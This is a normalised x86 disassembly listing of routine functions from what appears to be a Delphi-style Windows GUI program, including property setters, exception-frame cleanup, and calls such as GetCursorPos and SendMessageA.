sub_447f20
jmp sub_4039ac
sub_447f27
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447ff0
call GetCapture
retn
sub_447ff8
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cd90
pop ebx
retn
sub_448008
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_44826e
jmp sub_4039ac
sub_448468
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_44867c
jmp sub_4039ac
sub_448683
pop ebx
mov esp ebp
pop ebp
retn
sub_4486ce
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_44874b
jmp sub_4039ac
sub_448752
pop ebp
retn
sub_4487da
jmp sub_4039ac
sub_4487e1
pop ebp
retn
sub_448d0c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_413fa0
retn
sub_448d24
mov al 0x1
retn
sub_448d28
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_419e5c
retn
mov eax edx
retn
sub_448d38
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_419e2c
retn
mov al 0x1
retn
sub_449028
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413f44
pop esi
pop ebx
retn
sub_44903c
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_449078
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44923c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_449250
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_449264
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_449278
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_44928c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_4492a0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_4492b4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_4492c8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_4492dc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_4492f0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_449304
retn
sub_449308
retn
sub_44930c
retn
sub_449310
retn
sub_449314
retn
sub_449318
retn
sub_44931c
retn
sub_449320
retn
sub_449324
retn
sub_449328
retn
sub_44932c
retn
sub_449330
retn
sub_4495dc
jmp sub_4039ac
sub_449978
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x90 ] eax
sub_4499a0
push esi
mov si 0xffef
call sub_403454
pop esi
retn
sub_449a41
jmp sub_4039ac
sub_449a48
pop ebp
retn
sub_449a4c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4137cc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4137cc
sub_449c74
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_449e4d
jmp sub_4039ac
sub_449e54
pop ebx
pop ecx
pop ebp
retn
sub_449e58
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_449e60
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44a0c8
sub_449f0d
jmp sub_4039ac
sub_449f14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403258
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44a01c
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_44a15b
jmp sub_4039ac
sub_44a162
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44a1fa
jmp sub_4039ac
sub_44a201
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a21e
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_44a217
jmp sub_4039ac
sub_44a21e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403454
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a2f5
jmp sub_4039ac
sub_44a333
jmp sub_4039ac
sub_44a33a
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403454
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a4ff
jmp sub_4039ac
sub_44a506
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a523
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_44a51c
jmp sub_4039ac
sub_44a523
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44a59c
retn
sub_44a53c
jmp sub_4039ac
sub_44a58b
jmp sub_4039ac
sub_44a592
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44a61b
jmp sub_4039ac
sub_44a622
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44a628
or edx 0xffffffff
call sub_44a59c
retn
sub_44aa37
jmp sub_4039ac
sub_44aa3e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44aa5b
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_44aa54
jmp sub_4039ac
sub_44aa5b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44aa78
mov eax [ ebp - 0x4 ]
call sub_44b570
retn
sub_44aa71
jmp sub_4039ac
sub_44aa78
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ac7c
jmp sub_4039ac
sub_44ac83
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ac88
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403454
sub_44aca0
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_412ae8
pop ebx
retn
sub_44ad44
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_413de8
sub_44ae5b
jmp sub_4039ac
sub_44ae62
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403258
retn
sub_44ae78
jmp sub_4039ac
sub_44b18a
jmp sub_4039ac
sub_44b191
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b1ae
mov eax [ ebp - 0x10 ]
call sub_403258
retn
sub_44b1a7
jmp sub_4039ac
sub_44b1ae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b1cb
mov eax [ ebp - 0x8 ]
call sub_403258
retn
sub_44b1c4
jmp sub_4039ac
sub_44b1cb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b234
jmp sub_4039ac
sub_44b34d
jmp sub_4039ac
sub_44b36a
jmp sub_4039ac
sub_44b522
jmp sub_4039ac
sub_44b529
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b56c
inc [ eax + 0x5c ]
retn
sub_44b570
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403454
sub_44b5c4
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44b601
jmp sub_4039ac
sub_44b608
pop ebp
retn
sub_44b60c
sub [ rw-data ] 0x1
retn
sub_44b946
inc esp
add [ eax + 0x14004492 ] ah
int3
sub_44b94e
inc esp
add [ esp + ecx * 8 - 0x3347ffbc ] al
inc esp
add ah ch
int3
sub_44ba68
inc esp
add [ eax - 0x10 ] al
inc esp
add [ eax - 0x6bffbb0c ] ch
hlt
sub_44c574
mov eax [ esp + 0x8 ]
retn
sub_44c57c
push ebx
mov ebx eax
call sub_44c574
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
jmp sub_4039e4
sub_44c598
pop ebx
retn
sub_44c811
jmp sub_4039ac
sub_44c818
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c963
jmp sub_4039ac
sub_44c96a
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44c980
push ebx
mov eax [ rw-data ]
call sub_41445c
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_414418
mov eax ebx
pop ebx
retn
sub_44cb08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44cb24
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_44d21f
jmp sub_4039ac
sub_44d226
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d31e
jmp sub_4039ac
sub_44d325
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d748
jmp sub_4039ac
sub_44d74f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_44dbfb
jmp sub_4039ac
sub_44e09c
jmp sub_4039ac
sub_44e0a3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e507
jmp sub_4039ac
sub_44e9c4
jmp sub_4039ac
sub_44e9cb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ed76
jmp sub_4039ac
sub_44ed7d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44ed8b
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44ef38
mov eax [ r-xdata ]
retn
sub_44ef74
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44ef88
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44ef98
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44efa8
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_44f2a4
mov edx eax
sub_44f040
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403408
mov edx esi
call sub_44efc0
pop esi
pop ebx
retn
sub_44f0bc
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44f2a4
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_413fa0
mov ecx eax
sub_44f494
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_44f4fc
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_44f8a4
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_44f8d8
sub_44f8d8
mov edx sub_44f8b0
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_44ca00
retn
sub_44fac2
jmp sub_4039ac
sub_44fac9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ff60
jmp sub_4039ac
sub_44ff9f
jmp sub_4039ac
sub_44ffa6
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450144
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_450280
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403454
pop esi
pop ebp
retn 0x8
sub_45029c
mov eax [ eax + 0x34 ]
call sub_44d4d4
retn
sub_4502a8
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403454
pop esi
retn
sub_4502e4
push ebx
mov ecx sub_4502bc
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44ca00
pop ebx
retn
sub_450518
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45052c
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
j_sub_4036f8#7
jmp sub_4036f8
sub_450763
jmp sub_4039ac
sub_45078e
jmp sub_4039ac
sub_450795
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4507ac
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_450994
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4502e4
sub_450a14
jmp sub_4039ac
sub_450a58
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_450a70
push ebx
mov ebx eax
mov eax ebx
call sub_419e7c
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_450ac2
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_4502e4
sub_450b38
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_450c81
jmp sub_4039ac
sub_450c88
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_450ec8
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_450ed8
sub_450f2c
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_450f3c
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_450f4c
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_450f5c
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_450f6c
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_450fe4
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44d32c
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_44d32c
retn
sub_451000
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44d32c
sub_451048
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_45029c
retn
mov eax edx
retn
j_sub_4036f8#6
jmp sub_4036f8
sub_451087
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45cc50
call sub_403a60
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4513ed
jmp sub_4039ac
sub_4513f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403258
retn
sub_45140a
jmp sub_4039ac
sub_45150b
jmp sub_4039ac
sub_451512
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45152f
mov eax [ ebp - 0x14 ]
call sub_403258
retn
sub_451528
jmp sub_4039ac
sub_45154d
jmp sub_4039ac
sub_4515d7
jmp sub_4039ac
sub_4515de
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451610
push ebx
mov ebx eax
mov eax ebx
call sub_414088
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41ac2c
sub_4516d4
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_4516e8
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_4516f0
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_451ab5
jmp sub_4039ac
sub_451abc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_451bbc
jmp sub_4039ac
sub_451bc3
pop ebp
retn
sub_453a04
mov eax [ rw-data ]
retn
sub_453a0c
mov [ rw-data ] eax
retn
j_sub_4036f8#5
jmp sub_4036f8
sub_453b8b
jmp sub_4039ac
sub_453b92
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453e9a
jmp sub_4039ac
sub_453ea1
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_453f45
jmp sub_4039ac
sub_453f4c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453fdc
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_454708
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_454db4
sub_454724
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_454708
sub_454844
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_454db4
sub_45485c
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_454db4
sub_454874
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_454db4
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_4548a0
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_4548ac
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_454db4
retn
sub_454b8c
push ebx
mov ebx edx
mov edx ebx
call sub_440594
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_454bfc
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_454d24
jmp sub_4039ac
sub_454d2b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454d34
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_454140
mov eax [ ebx + 0x20c ]
call sub_454140
sub_454d94
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_454da4
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_454e9f
jmp sub_4039ac
sub_454eac
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_454ec4
sub_4550e0
retn
sub_45514e
jmp sub_4039ac
sub_45518d
jmp sub_4039ac
sub_4551c0
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_441a8c
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_4543cc
retn
sub_4551e4
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_441aac
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_4543cc
retn
sub_4552d9
jmp sub_4039ac
sub_4552e0
mov eax [ ebp - 0x4 ]
call sub_443a0c
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_454034
mov eax [ ebp - 0x4 ]
call sub_454db4
sub_455414
jmp sub_4039ac
sub_45544c
jmp sub_4039ac
sub_455453
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455473
lea eax [ ebp - 0x114 ]
call sub_403fa8
retn
sub_45546c
jmp sub_4039ac
sub_455473
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_45577a
jmp sub_4039ac
sub_455781
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035cc
j_sub_4036f8#4
jmp sub_4036f8
sub_455851
jmp sub_4036f8
sub_455856
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45cc50
call sub_403a60
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455c0e
jmp sub_4039ac
sub_455c15
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455cf0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417e0c
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_455d08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_455d40
mov edx eax
mov eax esi
call sub_419694
pop esi
pop ebx
retn
sub_455d24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4570e4
mov edx eax
mov eax esi
call sub_419694
pop esi
pop ebx
retn
sub_455d40
push ebx
mov ebx eax
mov eax ebx
call sub_456d84
mov edx r-xdata
call sub_41dba8
pop ebx
retn
sub_455e44
push ebx
mov ebx eax
mov eax ebx
call sub_455e54
xor al 0x1
pop ebx
retn
sub_455e54
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_455eb0
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_455ed0
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_455ef0
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4561e9
jmp sub_4039ac
sub_4561f0
pop ecx
pop ebp
retn
sub_4561f4
xor eax eax
retn
sub_4564cc
jmp sub_4039ac
sub_4564d3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_4564e9
jmp sub_4039ac
sub_4565d3
jmp sub_4039ac
sub_4565da
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4565f7
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_4565f0
jmp sub_4039ac
sub_456617
jmp sub_4039ac
sub_456902
jmp sub_4039ac
sub_456a95
jmp sub_4039ac
sub_456d84
mov eax [ eax + 0x238 ]
retn
sub_456d8c
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_456d98
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_4570d6
jmp sub_4039ac
sub_4570dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4570e4
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_45712c
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_440ca8
sub_457148
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_457184
push ebx
mov ebx eax
mov eax ebx
call sub_442c3c
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41d5e4
sub_457208
push ebx
mov ebx eax
mov eax ebx
call sub_442c64
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41dc4c
sub_457228
push ebx
mov ebx eax
mov eax ebx
call sub_456e48
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_456f10
pop ebx
retn
sub_457a55
lea eax [ ebp - 0xb4 ]
call sub_403fa8
retn
sub_457a61
jmp sub_4039ac
j_sub_457a55
jmp sub_457a55
sub_457a68
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457bc0
jmp sub_4039ac
sub_457bc7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457eac
jmp sub_4039ac
sub_457eb3
mov eax [ rw-data ]
call sub_45a764
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457eca
add [ eax ] al
retn
sub_458128
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_458148
mov eax [ eax + 0x240 ]
call sub_423928
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_45c504
sub_4581ef
jmp sub_4039ac
sub_4581f6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458219
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41dc24
retn
sub_458212
jmp sub_4039ac
sub_458219
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4583d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458148
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_458640
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_450450
sub_45872b
jmp sub_4039ac
sub_458732
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458738
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_457f20
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_458790
call sub_4594b8
retn
sub_458bdd
